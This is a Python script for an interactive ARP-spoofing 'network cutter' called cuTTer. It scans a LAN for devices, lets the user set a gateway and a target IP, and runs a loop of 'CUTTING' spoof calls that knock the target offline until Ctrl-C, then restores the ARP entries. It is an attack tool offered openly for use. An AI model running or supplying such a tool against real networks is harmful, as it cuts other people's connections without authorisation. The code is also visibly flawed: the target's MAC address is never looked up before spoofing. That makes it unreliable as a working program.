import os, sys
from colorama import Fore
import ipaddress
import time
from network import *

__banner__ = f"""{Fore.RED}
  .,-:::::  ...    :::::::::::::::::::::::::::.,:::::: :::::::..   
,;;;'````'  ;;     ;;;;;;;;;;;'''';;;;;;;;'''';;;;'''' ;;;;``;;;;  
[[[        [['     [[[     [[          [[      [[cccc   [[[,/[[['  
$$$        $$      $$$     $$          $$      $$\"\"\"\"   $$$$$$c    
`88bo,__,o,88    .d888     88,         88,     888oo,__ 888b \"88bo,
  \"YUMMMMMP\"\"YmmMMMM\"\"     MMM         MMM     \"\"\"\"YUMMMMMMM   \"W\"\

{Fore.RESET}
{Fore.RED}the simple network cutter in python{Fore.RESET}
by {Fore.RED}uhemn{Fore.RESET}
"""

__help__ = """
HELP MENU

    clear                        ->  clear the screen
    exit                         ->  exit the program
    banner                       ->  shows the banner
    scan || getdevices           ->  scan for devices on the network
    set.gateway || 'set gateway' -> set the gateway 
    set.target  || 'set target'  -> set the target
"""

# utils
is_root     = lambda: os.getuid() == 0
clearscr    = lambda: os.system("cls") if os.name == "nt" else os.system("clear")
def is_valid_ip(address):
    try:
        ipaddress.ip_address(address)
        return True
    except ValueError:
        return False



def shell():
    gateway = "undefined"
    target  = "undefined"
    hwtarget = ""
    hwgateway = ""
    running = True
    cutting = False
    print("try: \'help\'\n")
    while running:
        option = input(f"{Fore.RED}cuTTer {Fore.RESET}=> ").lower()
        
        if option == "exit":
            print("goodbye")
            running = False

        elif option == "clear":
            clearscr()

        elif option == "scan" or option == "getdevices":
            print("scanning for devices...")
            for dev in get_devices(input("enter a ip range (example : 192.168.1.0/24) => ")):
                print("\nIP: {} | MAC: {}".format(dev['ip'], dev['mac']))

        elif option == "set.gateway" or option == "set gateway":
            gateway = input("enter the gateway ip => ")
            if not is_valid_ip(gateway):
                print("invalid ip address, try again")
                continue
            hwgateway = get_mac(gateway)
            print("GATEWAY => {}".format(gateway))
        
        elif option == "set.target" or option == "set target":
            target = input("enter the target ip => ")
            if not is_valid_ip(target):
                print("invalid ip address, try again")
                continue
            print("TARGET => {}".format(target))

        elif option == "show.config" or option == "show config" or option == "config":
            print(f"GATEWAY => {gateway}")
            print(f"TARGET  => {target}")

        elif option == "cut" or option == "start":
            if target == "undefined" or gateway == "undefined":
                print("something is missing in the config")
                continue
            print(f"starting the {Fore.RED}atack{Fore.RESET}, press ctrl-c to stop it.")
            try:
                cutting = True
                while cutting:
                    print(f"{Fore.RED}CUTTING{Fore.RESET} -> {Fore.GREEN}{target}{Fore.RESET}")
                    spoof(target, gateway, hwtarget)
                    time.sleep(1)
            except KeyboardInterrupt:
                cutting = False
                print("re-arping the targets...")
                restore(target, gateway, hwtarget, hwgateway)

        elif option == "help":
            print(__help__)

        elif option == "banner":
            print(__banner__)

        else:
            print("command: '{}' not found".format(option))

if __name__ == "__main__":
    print(__banner__)
    if not is_root():
        print("ERROR: you need root privileges to run this script")
        sys.exit(-1)
    shell()
